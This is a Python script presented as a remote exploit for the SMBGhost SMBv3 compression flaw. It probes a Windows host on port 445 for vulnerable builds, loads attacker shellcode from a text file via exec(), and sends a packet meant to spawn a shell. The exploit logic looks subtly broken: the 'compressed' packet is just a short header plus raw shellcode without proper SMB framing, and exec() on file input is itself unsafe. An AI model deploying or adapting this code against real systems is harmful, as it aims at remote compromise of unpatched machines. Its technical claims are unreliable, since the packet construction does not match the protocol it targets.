# smbghost_advanced_exploit.py
import socket
import struct
import sys

def detect_target(ip, port=445):
    """Check for SMBv3 and likely Windows 10 v1903/1909"""
    negotiate_proto_request = bytes.fromhex(
        "00000054fe534d424000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000240000000100000000000000"
    )
    print(f"[*] Checking if {ip} is SMBGhost vulnerable...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(30)
        sock.connect((ip, port))
        sock.send(negotiate_proto_request)
        data = sock.recv(1024)
        sock.close()

        if b"\xfeSMB" in data:
            print("[+] SMBv3 protocol detected.")
            if b"\x06\x00\x00\x00" in data:
                print("[!!] Likely vulnerable build: Windows 10 v1903 or v1909.")
            else:
                print("[*] SMBv3 detected, but OS version is unclear.")
            return True
        else:
            print("[-] Target is not SMBv3.")
            return False
    except Exception as e:
        print(f"[!] Error during detection: {e}")
        return False

def build_smbghost_packet(shellcode):
    """Create a malicious compressed SMBv3 packet"""
    compression_header = struct.pack("<IHH", len(shellcode), 0x2, 0x0)
    return compression_header + shellcode

def send_exploit(ip, shellcode, port=445):
    """Send the exploit packet with embedded shellcode"""
    payload = build_smbghost_packet(shellcode)
    print(f"[+] Sending exploit to {ip}:{port}...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(payload)
        print("[*] Exploit sent. If target is vulnerable, a shell may spawn.")
    except Exception as e:
        print(f"[!] Failed to send exploit: {e}")
    finally:
        s.close()

def load_shellcode_from_txt(filename):
    """Read shellcode from .txt file (buf = b"...")"""
    shellcode = b""
    try:
        with open(filename, "r") as f:
            for line in f:
                if "buf" in line and "b\"" in line:
                    exec(line.strip(), globals())
                    shellcode = globals().get("buf", b"")
                    break
        if not shellcode:
            print("[!] Could not extract shellcode from txt.")
            sys.exit(1)
        return shellcode
    except Exception as e:
        print(f"[!] Error reading shellcode file: {e}")
        sys.exit(1)

def main():
    if len(sys.argv) != 3:
        print("Usage: python smbghost_advanced_exploit.py <target_ip> <shellcode.txt>")
        sys.exit(1)

    target_ip = sys.argv[1]
    shellcode_file = sys.argv[2]

    if detect_target(target_ip):
        shellcode = load_shellcode_from_txt(shellcode_file)
        send_exploit(target_ip, shellcode)
    else:
        print("[-] Exploit aborted: target not vulnerable.")

if __name__ == "__main__":
    main()
